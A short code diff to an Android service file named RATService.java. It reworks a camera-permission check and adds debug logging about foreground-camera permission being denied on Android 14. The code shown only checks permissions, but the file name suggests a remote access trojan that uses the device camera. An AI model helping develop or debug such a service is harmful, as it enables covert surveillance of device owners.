@@ -402,28 +402,33 @@ private void bringAppToForeground() {
     }
     
     // Add this method to RATService.java
-    private String checkCameraPermissions() {
-        StringBuilder result = new StringBuilder();
-        
-        try {
-            boolean hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                    == PackageManager.PERMISSION_GRANTED;
-            result.append("CAMERA: ").append(hasCamera).append(", ");
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                boolean hasForegroundCamera = ActivityCompat.checkSelfPermission(this, 
-                        Manifest.permission.FOREGROUND_SERVICE_CAMERA)
-                        == PackageManager.PERMISSION_GRANTED;
-                result.append("FOREGROUND_CAMERA: ").append(hasForegroundCamera);
-            } else {
-                result.append("FOREGROUND_CAMERA: not_required");
+   private String checkCameraPermissions() {
+    StringBuilder result = new StringBuilder();
+    try {
+        boolean hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                == PackageManager.PERMISSION_GRANTED;
+        result.append("CAMERA: ").append(hasCamera).append(", ");
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            int fgCamCheck = ActivityCompat.checkSelfPermission(this,
+                    Manifest.permission.FOREGROUND_SERVICE_CAMERA);
+            boolean hasFgCamera = fgCamCheck == PackageManager.PERMISSION_GRANTED;
+            result.append("FOREGROUND_CAMERA: ").append(hasFgCamera)
+                  .append(" (check result: ").append(fgCamCheck).append(") ");
+
+            // Extra debug
+            Log.w(TAG, "FOREGROUND_SERVICE_CAMERA checkSelfPermission result = " + fgCamCheck);
+            if (fgCamCheck == PackageManager.PERMISSION_DENIED) {
+                Log.w(TAG, "→ DENIED even after grant - possible Android 14 restriction");
             }
-        } catch (Exception e) {
-            result.append("ERROR: ").append(e.getMessage());
+        } else {
+            result.append("FOREGROUND_CAMERA: not_required");
         }
-        
-        return result.toString();
+    } catch (Exception e) {
+        result.append("ERROR: ").append(e.getMessage());
     }
+    return result.toString();
+}
     
     private boolean checkCameraPermission() {
         return ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
